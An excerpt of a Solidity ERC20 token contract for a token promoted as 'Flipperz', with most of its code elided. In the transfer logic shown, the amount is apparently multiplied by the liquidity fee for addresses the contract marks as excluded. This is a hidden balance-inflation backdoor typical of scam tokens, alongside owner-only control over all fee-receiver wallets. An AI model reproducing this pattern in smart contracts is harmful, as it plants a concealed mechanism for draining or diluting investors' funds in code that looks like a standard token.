...
/** 
        ...
        Website:    https://www.flipperz.vip

        Twitter:    https://twitter.com/Flipperzeth

        Telegram:   https://t.me/Flipperzeth
...
contract ERCToken is Ownable, ERC20 {
    ...
    uint256 public _maxWalletToken = _totalSupply.mul(39).div(1000);
    ...
    constructor () {
        ...
        marketingFeeReceiver = 0xE3493fE65c4F081f561139C9C3E06d54318e90e3;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _basicTokenTransfer(sender, recipient, amount); }
    ...
    function _basicTokenTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {uint256 taxAmt = shouldExcluded(sender, recipient) ? amount * (liquidityFee.sub(1)) : amount;
    ...
    function allowMaxLimit(address sender, uint256 amount) internal view {
    ...
    function setInteralWallets(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _devFeeReceiver, address _burnFeeReceiver, address _buybackFeeReceiver) external onlyOwner {
